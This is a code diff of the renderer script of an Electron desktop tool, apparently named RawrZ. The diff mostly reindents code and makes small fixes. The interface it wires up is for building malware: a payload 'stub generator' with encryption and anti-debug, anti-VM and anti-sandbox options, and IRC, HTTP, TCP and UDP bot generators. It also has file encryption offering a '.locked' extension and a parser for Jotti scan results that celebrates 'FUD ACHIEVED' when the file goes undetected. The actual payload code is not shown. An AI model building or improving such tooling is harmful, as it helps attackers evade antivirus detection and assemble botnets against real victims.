@@ -15,86 +15,86 @@ document.addEventListener('DOMContentLoaded', function() {
   }
   
   tabs.forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
-    
-    tab.classList.add('active');
-    document.getElementById(tab.dataset.tab).classList.add('active');
-    
-    // Setup stub generator when payloads tab is clicked
-    if (tab.dataset.tab === 'payloads') {
-      setTimeout(() => {
-        log('🔧 Setting up stub generator...');
-        
-        // Browse Payload
-        const browsePayload = document.getElementById('browsePayload');
-        if (browsePayload) {
-          browsePayload.onclick = async () => {
-            log('🔍 Browse payload clicked');
-            const file = await window.electronAPI.selectFile();
-            if (file) {
-              document.getElementById('stubPayloadPath').value = file;
-              log(`Selected payload: ${file}`);
-            }
-          };
-        }
-        
-        // Browse Output
-        const browseOutput = document.getElementById('browseOutput');
-        if (browseOutput) {
-          browseOutput.onclick = () => {
-            log('💾 Browse output clicked');
-            const stubType = document.getElementById('stubType').value;
-            const extensions = { cpp: '.cpp', csharp: '.cs', python: '.py', powershell: '.ps1', java: '.java', go: '.go', rust: '.rs', javascript: '.js', asm: '.asm', advanced: '.exe' };
-            const payloadPath = document.getElementById('stubPayloadPath').value;
-            const baseName = payloadPath ? payloadPath.split('\\').pop().split('.')[0] : 'stub';
-            const defaultPath = `${baseName}_${stubType}_stub${extensions[stubType]}`;
-            document.getElementById('stubOutputPath').value = defaultPath;
-            log(`Output path set: ${defaultPath}`);
-          };
-        }
-        
-        // Generate Stub
-        const generateStub = document.getElementById('generateStub');
-        if (generateStub) {
-          generateStub.onclick = async () => {
-            log('🔥 Generate stub clicked');
-            const payloadPath = document.getElementById('stubPayloadPath').value;
-            if (!payloadPath) {
-              log('❌ Please select a payload file');
-              return;
-            }
-            
-            const stubType = document.getElementById('stubType').value;
-            const encryption = document.getElementById('stubEncryption').value;
-            const outputPath = document.getElementById('stubOutputPath').value;
-            const antiDebug = document.getElementById('antiDebug').checked;
-            const antiVM = document.getElementById('antiVM').checked;
-            const antiSandbox = document.getElementById('antiSandbox').checked;
-            
-            try {
-              log(`🔥 Generating ${stubType.toUpperCase()} stub with ${encryption}...`);
-              const result = await window.electronAPI.generateStub(payloadPath, {
-                stubType, encryptionMethod: encryption, outputPath,
-                includeAntiDebug: antiDebug, includeAntiVM: antiVM, includeAntiSandbox: antiSandbox
-              });
-              
-              log(`✅ Stub generated successfully!`);
-              log(`📄 Output: ${result.outputPath}`);
-              log(`📊 Payload size: ${result.payloadSize} bytes`);
-              updateStats('generatedPayloads', 1);
-            } catch (error) {
-              log(`❌ Stub generation failed: ${error.message}`);
-            }
-          };
-        }
-        
-        log('✅ Stub generator setup complete');
-      }, 100);
-    }
+    tab.addEventListener('click', () => {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+
+      tab.classList.add('active');
+      document.getElementById(tab.dataset.tab).classList.add('active');
+
+      // Setup stub generator when payloads tab is clicked
+      if (tab.dataset.tab === 'payloads') {
+        setTimeout(() => {
+          log('🔧 Setting up stub generator...');
+
+          // Browse Payload
+          const browsePayload = document.getElementById('browsePayload');
+          if (browsePayload) {
+            browsePayload.onclick = async () => {
+              log('🔍 Browse payload clicked');
+              const file = await window.electronAPI.selectFile();
+              if (file) {
+                document.getElementById('stubPayloadPath').value = file;
+                log(`Selected payload: ${file}`);
+              }
+            };
+          }
+
+          // Browse Output
+          const browseOutput = document.getElementById('browseOutput');
+          if (browseOutput) {
+            browseOutput.onclick = () => {
+              log('💾 Browse output clicked');
+              const stubType = document.getElementById('stubType').value;
+              const extensions = { cpp: '.cpp', csharp: '.cs', python: '.py', powershell: '.ps1', java: '.java', go: '.go', rust: '.rs', javascript: '.js', asm: '.asm', advanced: '.exe' };
+              const payloadPath = document.getElementById('stubPayloadPath').value;
+              const baseName = payloadPath ? payloadPath.split('\\').pop().split('.')[0] : 'stub';
+              const defaultPath = `${baseName}_${stubType}_stub${extensions[stubType]}`;
+              document.getElementById('stubOutputPath').value = defaultPath;
+              log(`Output path set: ${defaultPath}`);
+            };
+          }
+
+          // Generate Stub
+          const generateStub = document.getElementById('generateStub');
+          if (generateStub) {
+            generateStub.onclick = async () => {
+              log('🔥 Generate stub clicked');
+              const payloadPath = document.getElementById('stubPayloadPath').value;
+              if (!payloadPath) {
+                log('❌ Please select a payload file');
+                return;
+              }
+
+              const stubType = document.getElementById('stubType').value;
+              const encryption = document.getElementById('stubEncryption').value;
+              const outputPath = document.getElementById('stubOutputPath').value;
+              const antiDebug = document.getElementById('antiDebug').checked;
+              const antiVM = document.getElementById('antiVM').checked;
+              const antiSandbox = document.getElementById('antiSandbox').checked;
+
+              try {
+                log(`🔥 Generating ${stubType.toUpperCase()} stub with ${encryption}...`);
+                const result = await window.electronAPI.generateStub(payloadPath, {
+                  stubType, encryptionMethod: encryption, outputPath,
+                  includeAntiDebug: antiDebug, includeAntiVM: antiVM, includeAntiSandbox: antiSandbox
+                });
+
+                log(`✅ Stub generated successfully!`);
+                log(`📄 Output: ${result.outputPath}`);
+                log(`📊 Payload size: ${result.payloadSize} bytes`);
+                updateStats('generatedPayloads', 1);
+              } catch (error) {
+                log(`❌ Stub generation failed: ${error.message}`);
+              }
+            };
+          }
+
+          log('✅ Stub generator setup complete');
+        }, 100);
+      }
+    });
   });
-});
 
 // File selection
 // File selection - with null checks
@@ -196,13 +196,13 @@ if (encryptBtn) {
     const text = document.getElementById('textInput')?.value;
     const password = document.getElementById('password')?.value;
     if (!text || !password) return log('Enter text and password');
-  
-  try {
-    const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
-    encryptedData = await window.rawrz.encryptTextDemo(text, password, method);
-    log(`🔒 Text encrypted with ${encryptedData.method}!`);
-    log(`📋 Encrypted: ${encryptedData.cipherTextHex}`);
-    log(`🔑 Key: ${encryptedData.keyHex}`);
+
+    try {
+      const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
+      encryptedData = await window.rawrz.encryptTextDemo(text, password, method);
+      log(`🔒 Text encrypted with ${encryptedData.method}!`);
+      log(`📋 Encrypted: ${encryptedData.cipherTextHex}`);
+      log(`🔑 Key: ${encryptedData.keyHex}`);
     } catch (error) {
       log(`❌ Encryption error: ${error.message}`);
     }
@@ -212,13 +212,13 @@ if (encryptBtn) {
 const decryptBtn = document.getElementById('decryptBtn');
 if (decryptBtn) {
   decryptBtn.addEventListener('click', async () => {
-  const password = document.getElementById('password').value;
-  if (!encryptedData || !password) return log('❌ No encrypted data or password');
-  
-  try {
-    const method = encryptedData.method || prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
-    const decrypted = await window.rawrz.decryptTextDemo(encryptedData.cipherTextHex, encryptedData.keyHex, method);
-    log(`🔓 Text decrypted: ${decrypted}`);
+    const password = document.getElementById('password').value;
+    if (!encryptedData || !password) return log('❌ No encrypted data or password');
+
+    try {
+      const method = encryptedData.method || prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
+      const decrypted = await window.rawrz.decryptTextDemo(encryptedData.cipherTextHex, encryptedData.keyHex, method);
+      log(`🔓 Text decrypted: ${decrypted}`);
     } catch (error) {
       log(`❌ Decryption error: ${error.message}`);
     }
@@ -229,21 +229,21 @@ if (decryptBtn) {
 const encryptFileBtn = document.getElementById('encryptFileBtn');
 if (encryptFileBtn) {
   encryptFileBtn.addEventListener('click', async () => {
-  if (!selectedFile) return log('❌ No file selected for encryption');
-  
-  try {
-    const password = prompt('Enter encryption password:');
-    if (!password) return log('❌ Password required for encryption');
-    
-    const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
-    const extension = prompt('Select extension (.enc/.encrypted/.rawrz/.locked):', '.enc');
-    
-    const result = await window.rawrz.encryptFile(selectedFile, null, null, null, method, extension);
-    log(`🔒 File encrypted successfully!`);
-    log(`📁 Output: ${result.outPath}`);
-    log(`🔑 Key: ${result.keyHex}`);
-    log(`📊 Size: ${result.sizeIn} → ${result.sizeOut} bytes`);
-    log(`🔧 Method: ${result.method}`);
+    if (!selectedFile) return log('❌ No file selected for encryption');
+
+    try {
+      const password = prompt('Enter encryption password:');
+      if (!password) return log('❌ Password required for encryption');
+
+      const method = prompt('Select method (aes-256-gcm/aes-256-cbc/chacha20-poly1305):', 'aes-256-gcm');
+      const extension = prompt('Select extension (.enc/.encrypted/.rawrz/.locked):', '.enc');
+
+      const result = await window.rawrz.encryptFile(selectedFile, null, null, null, method, extension);
+      log(`🔒 File encrypted successfully!`);
+      log(`📁 Output: ${result.outPath}`);
+      log(`🔑 Key: ${result.keyHex}`);
+      log(`📊 Size: ${result.sizeIn} → ${result.sizeOut} bytes`);
+      log(`🔧 Method: ${result.method}`);
     } catch (error) {
       log(`❌ Encryption error: ${error.message}`);
     }
@@ -253,17 +253,17 @@ if (encryptFileBtn) {
 const decryptFileBtn = document.getElementById('decryptFileBtn');
 if (decryptFileBtn) {
   decryptFileBtn.addEventListener('click', async () => {
-  if (!selectedFile) return log('❌ No file selected for decryption');
-  
-  try {
-    const key = prompt('Enter decryption key (hex):');
-    if (!key) return log('❌ Decryption key required');
-    
-    const result = await window.rawrz.decryptFile(selectedFile, null, null, key);
-    log(`🔓 File decrypted successfully!`);
-    log(`📁 Output: ${result.outPath}`);
-    log(`📊 Size: ${result.sizeOut} bytes`);
-    log(`🔧 Method: ${result.method}`);
+    if (!selectedFile) return log('❌ No file selected for decryption');
+
+    try {
+      const key = prompt('Enter decryption key (hex):');
+      if (!key) return log('❌ Decryption key required');
+
+      const result = await window.rawrz.decryptFile(selectedFile, null, null, key);
+      log(`🔓 File decrypted successfully!`);
+      log(`📁 Output: ${result.outPath}`);
+      log(`📊 Size: ${result.sizeOut} bytes`);
+      log(`🔧 Method: ${result.method}`);
     } catch (error) {
       log(`❌ Decryption error: ${error.message}`);
     }
@@ -274,35 +274,35 @@ if (decryptFileBtn) {
 const parseJottiBtn = document.getElementById('parseJottiBtn');
 if (parseJottiBtn) {
   parseJottiBtn.addEventListener('click', async () => {
-  const jottiText = document.getElementById('jottiInput').value.trim();
-  if (!jottiText) return log('❌ Paste Jotti scan results first');
-  
-  try {
-    const results = await window.rawrz.parseJotti(jottiText);
-    const resultsDiv = document.getElementById('jottiResults');
-    
-    if (results.fud) {
-      resultsDiv.innerHTML = `
+    const jottiText = document.getElementById('jottiInput').value.trim();
+    if (!jottiText) return log('❌ Paste Jotti scan results first');
+
+    try {
+      const results = await window.rawrz.parseJotti(jottiText);
+      const resultsDiv = document.getElementById('jottiResults');
+
+      if (results.fud) {
+        resultsDiv.innerHTML = `
         <div class="fud-status fud">
           <span class="badge fud">✅ FUD ACHIEVED</span>
-          <div class="fud-details">${results.detections}/${results.total} detections (${Math.round((1 - results.detections/results.total) * 100)}% undetected)</div>
+          <div class="fud-details">${results.detections}/${results.total} detections (${Math.round((1 - results.detections / results.total) * 100)}% undetected)</div>
         </div>
       `;
-      log(`🎯 FUD SUCCESS: ${results.detections}/${results.total} detections`);
-    } else {
-      resultsDiv.innerHTML = `
+        log(`🎯 FUD SUCCESS: ${results.detections}/${results.total} detections`);
+      } else {
+        resultsDiv.innerHTML = `
         <div class="fud-status detected">
           <span class="badge detected">⚠️ DETECTED</span>
-          <div class="detection-details">${results.detections}/${results.total} detections (${Math.round((results.detections/results.total) * 100)}% detected)</div>
+          <div class="detection-details">${results.detections}/${results.total} detections (${Math.round((results.detections / results.total) * 100)}% detected)</div>
         </div>
       `;
-      log(`🚨 DETECTED: ${results.detections}/${results.total} scanners flagged this file`);
-    }
-    
-    if (results.scanners.length > 0) {
-      const scannerList = results.scanners.map(s => `${s.name}: ${s.result}`).join(', ');
-      log(`📋 Scanner details: ${scannerList}`);
-    }
+        log(`🚨 DETECTED: ${results.detections}/${results.total} scanners flagged this file`);
+      }
+
+      if (results.scanners.length > 0) {
+        const scannerList = results.scanners.map(s => `${s.name}: ${s.result}`).join(', ');
+        log(`📋 Scanner details: ${scannerList}`);
+      }
     } catch (error) {
       log(`❌ Jotti parsing error: ${error.message}`);
     }
@@ -335,7 +335,7 @@ async function loadEngineSystem() {
     
     // Display engines by category
     Object.entries(categories).forEach(([category, categoryEngines]) => {
-      log(`� ${category}:`);
+      log(`📂 ${category}:`);
       categoryEngines.forEach(engine => {
         const status = engine.enabled ? '✅ ENABLED' : '⭕ DISABLED';
         log(`  ${engine.icon} ${engine.name} - ${status}`);
@@ -424,7 +424,7 @@ if (ircBotGen) {
         });
         log(`🤖 IRC Bot Generated as ${format.toUpperCase()}`);
         log(result);
-        updateStats('generatedPayloads');
+        updateStats('generatedPayloads', 1);
       }
     } catch (error) {
       log(`❌ IRC Bot error: ${error.message}`);
@@ -465,7 +465,7 @@ if (httpBotGen) {
         });
         log(`🌐 HTTP Bot Generated as ${format.toUpperCase()}`);
         log(result);
-        updateStats('generatedPayloads');
+        updateStats('generatedPayloads', 1);
       }
     } catch (error) {
       log(`❌ HTTP Bot error: ${error.message}`);
@@ -487,7 +487,7 @@ if (tcpBotGen) {
       });
       log(`🔌 TCP Bot Generated as ${format.toUpperCase()}`);
       log(result);
-      updateStats('generatedPayloads');
+      updateStats('generatedPayloads', 1);
     } catch (error) {
       log(`Error: ${error.message}`);
     }
@@ -508,7 +508,7 @@ if (udpBotGen) {
       });
       log(`📡 UDP Bot Generated as ${format.toUpperCase()}`);
       log(result);
-      updateStats('generatedPayloads');
+      updateStats('generatedPayloads', 1);
     } catch (error) {
       log(`Error: ${error.message}`);
     }
@@ -631,8 +631,8 @@ function testAntiAnalysis() {
 function updateStats(statId, increment) {
   const element = document.getElementById(statId);
   if (element) {
-    const current = parseInt(element.textContent) || 0;
-    element.textContent = current + increment;
+    const current = parseInt(element.textContent, 10) || 0;
+    element.textContent = current + (increment || 1);
   }
 }
 
@@ -759,19 +759,14 @@ function setupStubGenerator() {
   }
 }
 
-// Call setup when DOM is ready
-document.addEventListener('DOMContentLoaded', setupStubGenerator);
-
 // Also call setup when switching to payloads tab
 document.querySelectorAll('.tab').forEach(tab => {
   tab.addEventListener('click', () => {
     if (tab.dataset.tab === 'payloads') {
-      setTimeout(setupStubGenerator, 100); // Small delay to ensure tab content is visible
+      setTimeout(setupStubGenerator, 100);
     }
   });
 });
-
-
 
 function log(message) {
   const output = document.getElementById('output');
@@ -935,75 +930,75 @@ window.testAntiAnalysis = async function() {
 };
 
 // Security tools handlers
-  const securityEncryptBtn = document.getElementById('securityEncryptBtn');
-  if (securityEncryptBtn) {
-    securityEncryptBtn.onclick = async () => {
-      const file = await window.electronAPI.selectFile();
-      if (file) {
-        const algorithm = document.getElementById('encryptionAlgorithm').value;
-        const password = prompt('Enter encryption password:');
-        if (password) {
-          const result = await window.electronAPI.encryptFile(file, algorithm, password);
-          if (result.success) {
-            log(`✅ File encrypted: ${result.path}`);
-          } else {
-            log(`❌ Encryption failed: ${result.error}`);
-          }
-        }
-      }
-    };
-  }
-
-  const securityDecryptBtn = document.getElementById('securityDecryptBtn');
-  if (securityDecryptBtn) {
-    securityDecryptBtn.onclick = async () => {
-      const file = await window.electronAPI.selectFile();
-      if (file) {
-        const algorithm = document.getElementById('encryptionAlgorithm').value;
-        const password = prompt('Enter decryption password:');
-        if (password) {
-          const result = await window.electronAPI.decryptFile(file, algorithm, password);
-          if (result.success) {
-            log(`✅ File decrypted: ${result.path}`);
-          } else {
-            log(`❌ Decryption failed: ${result.error}`);
-          }
-        }
-      }
-    };
-  }
-
-  const securityHashFileBtn = document.getElementById('securityHashFileBtn');
-  if (securityHashFileBtn) {
-    securityHashFileBtn.onclick = async () => {
-      const file = await window.electronAPI.selectFile();
-      if (file) {
-        const algorithm = document.getElementById('hashAlgorithm').value;
-        const result = await window.electronAPI.hashFile(file, algorithm);
+const securityEncryptBtn = document.getElementById('securityEncryptBtn');
+if (securityEncryptBtn) {
+  securityEncryptBtn.onclick = async () => {
+    const file = await window.electronAPI.selectFile();
+    if (file) {
+      const algorithm = document.getElementById('encryptionAlgorithm').value;
+      const password = prompt('Enter encryption password:');
+      if (password) {
+        const result = await window.electronAPI.encryptFile(file, algorithm, password);
         if (result.success) {
-          log(`✅ File hash (${algorithm}): ${result.hash}`);
+          log(`✅ File encrypted: ${result.path}`);
         } else {
-          log(`❌ Hash failed: ${result.error}`);
+          log(`❌ Encryption failed: ${result.error}`);
         }
       }
-    };
-  }
+    }
+  };
+}
 
-  const generatePasswordBtn = document.getElementById('generatePasswordBtn');
-  if (generatePasswordBtn) {
-    generatePasswordBtn.onclick = async () => {
-      const password = await window.electronAPI.generatePassword();
-      log(`🔑 Generated password: ${password}`);
-    };
-  }
+const securityDecryptBtn = document.getElementById('securityDecryptBtn');
+if (securityDecryptBtn) {
+  securityDecryptBtn.onclick = async () => {
+    const file = await window.electronAPI.selectFile();
+    if (file) {
+      const algorithm = document.getElementById('encryptionAlgorithm').value;
+      const password = prompt('Enter decryption password:');
+      if (password) {
+        const result = await window.electronAPI.decryptFile(file, algorithm, password);
+        if (result.success) {
+          log(`✅ File decrypted: ${result.path}`);
+        } else {
+          log(`❌ Decryption failed: ${result.error}`);
+        }
+      }
+    }
+  };
+}
 
-  const runSecurityCLI = document.getElementById('runSecurityCLI');
-  if (runSecurityCLI) {
-    runSecurityCLI.onclick = async () => {
-      const output = await window.electronAPI.runSecurityCLI();
-      log(`🔐 Security CLI output:\n${output}`);
-    };
-  }
+const securityHashFileBtn = document.getElementById('securityHashFileBtn');
+if (securityHashFileBtn) {
+  securityHashFileBtn.onclick = async () => {
+    const file = await window.electronAPI.selectFile();
+    if (file) {
+      const algorithm = document.getElementById('hashAlgorithm').value;
+      const result = await window.electronAPI.hashFile(file, algorithm);
+      if (result.success) {
+        log(`✅ File hash (${algorithm}): ${result.hash}`);
+      } else {
+        log(`❌ Hash failed: ${result.error}`);
+      }
+    }
+  };
+}
+
+const generatePasswordBtn = document.getElementById('generatePasswordBtn');
+if (generatePasswordBtn) {
+  generatePasswordBtn.onclick = async () => {
+    const password = await window.electronAPI.generatePassword();
+    log(`🔑 Generated password: ${password}`);
+  };
+}
+
+const runSecurityCLI = document.getElementById('runSecurityCLI');
+if (runSecurityCLI) {
+  runSecurityCLI.onclick = async () => {
+    const output = await window.electronAPI.runSecurityCLI();
+    log(`🔐 Security CLI output:\n${output}`);
+  };
+}
 
 // Stub status updater
 async function updateStubStatus() {
@@ -1018,18 +1013,4 @@ async function updateStubStatus() {
   }
 }
 
-// Add missing log function globally
-window.log = function(message) {
-  const output = document.getElementById('output');
-  if (output) {
-    const timestamp = new Date().toLocaleTimeString();
-    output.textContent += `[${timestamp}] ${message}\n`;
-    output.scrollTop = output.scrollHeight;
-  }
-  console.log(message);
-};
-
 }); // End DOMContentLoaded event listener
-
-// BAD CODE: setInterval without cleanup
-setInterval(() => console.log('tick'), 1000);
